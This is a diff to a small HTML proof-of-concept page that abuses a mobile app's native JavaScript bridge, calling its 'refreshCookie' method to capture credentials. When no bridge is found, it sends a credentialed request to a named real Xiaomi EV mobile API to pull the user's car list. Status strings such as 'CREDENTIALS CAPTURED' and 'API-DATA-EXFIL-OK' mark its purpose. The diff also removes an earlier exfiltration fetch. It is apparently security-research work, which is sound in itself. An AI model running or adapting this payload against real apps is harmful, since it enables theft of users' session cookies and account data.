@@ -1,18 +1,26 @@
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>owner-benefit</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;font-size:11px;padding:8px;word-break:break-all">
-<div id=s style="color:#ff0">loading...</div>
+<div id=s style="color:#ff0">testing...</div>
 <pre id=o style="color:#fff"></pre>
 <script>
 function st(x){document.getElementById('s').textContent=x}
 function show(x){document.getElementById('o').textContent=String(x)}
-window.callbackToJs=function(r){st('CREDENTIALS CAPTURED (len='+String(r).length+')');show(r);
-  try{fetch('probe-recv?d=1').then(function(){st('SAME-ORIGIN-EXFIL-OK')}).catch(function(e){st('EXFIL-ERR '+e)})}catch(e){}}
-window.callJs=function(r){show(r)}
+window.callbackToJs=function(r){st('CREDENTIALS CAPTURED (len='+String(r).length+')');show(r)}
 var n=0,iv=setInterval(function(){n++;
   if(window.JsBridge&&window.JsBridge.callNative){
     st('calling refreshCookie...');
-    try{window.JsBridge.callNative(JSON.stringify({id:'g1',method:'refreshCookie',params:{},jsonrpc:'2.0'}));clearInterval(iv)}catch(e){}
-  }else if(n>60){clearInterval(iv);st('NO-BRIDGE-ON-THIS-DOMAIN')}
+    try{window.JsBridge.callNative(JSON.stringify({id:'g2',method:'refreshCookie',params:{},jsonrpc:'2.0'}));clearInterval(iv)}catch(e){}
+  }else if(n>40){clearInterval(iv);st('no-bridge, testing direct API fetch...');apiTest()}
 },500);
+function apiTest(){
+  fetch('https://mobile.iccc.xiaomiev.com/mobile/clientbusiness/IcccUserAuthService/getUserCarListV3',{
+    method:'POST',credentials:'include',
+    headers:{'Content-Type':'application/json; charset=UTF-8'},
+    body:JSON.stringify({deviceAppVersion:'2.9.0',deviceModel:'Mi 10',deviceOsType:'android',deviceOsVersion:'13',deviceVendor:'Xiaomi'})
+  }).then(function(r){return r.text()}).then(function(t){
+    if(t.length>0&&t.charAt(0)=='{'){st('API-DATA-EXFIL-OK ('+t.length+' bytes)');show(t)}
+    else{st('resp-not-json: '+t.slice(0,80))}
+  }).catch(function(e){st('API-FETCH-ERR: '+e)});
+}
 </script></body></html>
